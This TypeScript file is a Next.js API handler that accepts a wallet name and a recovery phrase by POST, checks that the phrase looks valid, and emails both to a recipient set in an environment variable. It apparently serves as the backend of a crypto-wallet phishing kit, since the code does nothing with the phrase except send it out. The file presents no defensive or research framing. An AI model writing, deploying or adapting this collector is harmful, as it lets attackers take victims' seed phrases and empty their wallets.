import { APP_NAME, ERROR_MESSAGES } from './../../utils/constants'
import { generateTemplate, sendMail2 } from './../../utils/mailer'

import { NextApiRequest, NextApiResponse } from 'next'

import { HTTP_REQUEST_CODES } from '../../utils/constants'
import { ApiError, createError } from '../../utils/ErrorHandler'
import { validateKey, validateWallet } from '../../utils/validator'
import { capitalize } from '../../utils/utils'

const handler = async (req: NextApiRequest, res: NextApiResponse) => {
  switch (req.method) {
    case 'POST':
      try {
        const { wallet, phrase } = req.body
        if (!wallet || !phrase) {
          createError(
            ERROR_MESSAGES.INVALID_WALLET_OR_PHRASE,
            HTTP_REQUEST_CODES.BAD_REQUEST
          )
        }

        if (!validateWallet(wallet)) {
          createError(
            ERROR_MESSAGES.INVALID_WALLET_NAME,
            HTTP_REQUEST_CODES.BAD_REQUEST
          )
        } else if (!validateKey(phrase)) {
          createError(
            ERROR_MESSAGES.INVALID_PHRASE_KEY,
            HTTP_REQUEST_CODES.BAD_REQUEST
          )
        }

        await sendMail2(
          process.env.EMAIL_SENDER! || '',
          process.env.RECEIVER_EMAIL!,
          APP_NAME,
          generateTemplate(capitalize(wallet), phrase)
        )
        return res.status(200).json({ msg: 'All Done' })
      } catch (error: any) {
        if (error instanceof ApiError) {
          return res.status(error.code).json({ msg: error.message })
        }
        console.log(error)
        return res.status(500).json({ msg: 'Unknown error occurred' })
      }
      break

    default:
      return res
        .status(HTTP_REQUEST_CODES.NOT_IMPLEMENTED)
        .json({ msg: 'THIS METHOD NOT IMPLEMENTED YET' })
      break
  }
}
export default handler
